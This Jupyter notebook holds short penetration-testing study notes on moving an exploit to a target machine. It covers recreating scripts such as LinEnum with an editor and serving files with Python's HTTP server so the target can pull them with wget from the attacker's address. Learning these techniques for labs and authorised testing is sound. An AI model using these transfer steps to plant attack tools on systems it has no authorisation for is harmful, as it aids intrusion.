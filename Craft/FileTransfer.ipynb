{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "10e7fdfc-63bd-4487-8a66-3cd5d2bd58df",
   "metadata": {},
   "source": [
    "# File Transfer to Machines\n",
    "\n",
    "Ok, so you have this great exploit that you can push to a target machine. You even have a low privilege users who can put the file for you. Now the question becomes; \"how do I get my file to the remote machine\"? As is rather standard with this sort of stuff, the answer is \"Many ways\".\n",
    "\n",
    "## Just re-make the file\n",
    "So this one is often overlooked, but with script files it's probably the easiest method. Simply create a blank file on the target machine and write your script to the file (naturally this only works for scripts). An example of this would be transferring LinEnum to a machine by writing the file with nano or vi. <br>\n",
    "Remember to change the script to have execute permissions when you're done.\n",
    "> chmod +x [file]\n",
    "\n",
    "<hr>\n",
    "\n",
    "## Python's SimpleHTTPServer\n",
    "\n",
    "Like it says on the box, a simple http server you can host locally for a remote machine to connect to. On your local machine, create a folder that you want to host files from. In that folder, run the below command.\n",
    "\n",
    "![JrPen-FileInclusion_PythonServer.png](../images/JrPen-FileInclusion_PythonServer.png)\n",
    "\n",
    "You can the pull files using wget (as long as the target is routable to you).\n",
    "\n",
    "> wget 'http://[yourIP]:[port]/[file.ext]'\n",
    "\n",
    "<hr>\n",
    "\n",
    "## Python's HTTP.Server\n",
    "Basically the same as above, but for python3. The below hosts on port 8888\n",
    "\n",
    "> python3 -m http.server 8888\n",
    "\n",
    "<hr>"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
